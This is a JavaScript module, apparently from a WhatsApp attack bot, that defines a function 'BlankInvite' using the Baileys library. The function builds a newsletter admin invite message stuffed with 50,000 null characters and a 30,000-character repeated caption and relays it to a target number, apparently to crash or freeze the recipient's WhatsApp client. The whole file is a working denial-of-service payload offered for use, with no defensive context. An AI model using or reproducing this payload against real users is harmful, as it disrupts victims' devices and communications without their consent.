// ./data/crash/sparked.js
const { generateWAMessageFromContent, proto } = require('baileys');
const chalk = require('chalk'); // Ensure chalk is imported if used for console logs

async function BlankInvite(LockJids, LordVoltage) {
    try {
        var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
            'viewOnceMessage': {
                'message': {
                    "newsletterAdminInviteMessage": {
                        "newsletterJid": `120363298524333143@newsletter`,
                        "newsletterName": "zSHADØW-𝐕5⃟⃟⃟😈" + "\u0000".repeat(50000), // Changed to SHADØW V1 
                        "jpegThumbnail": "",
                        "caption": 'ꦾ'.repeat(30000),
                        "inviteExpiration": Date.now() + 1600
                    }
                }
            }
        }), {
            'userJid': LockJids
        });
        await LordVoltage.relayMessage(LockJids, messageContent.message, {
            'participant': {
                'jid': LockJids
            },
            'messageId': messageContent.key.id
        });
    } catch (error) {
        console.error("An error occurred in BlankInvite (sparked.js):", error);
    }
}

module.exports = { BlankInvite }; // Export BlankInvite from this file
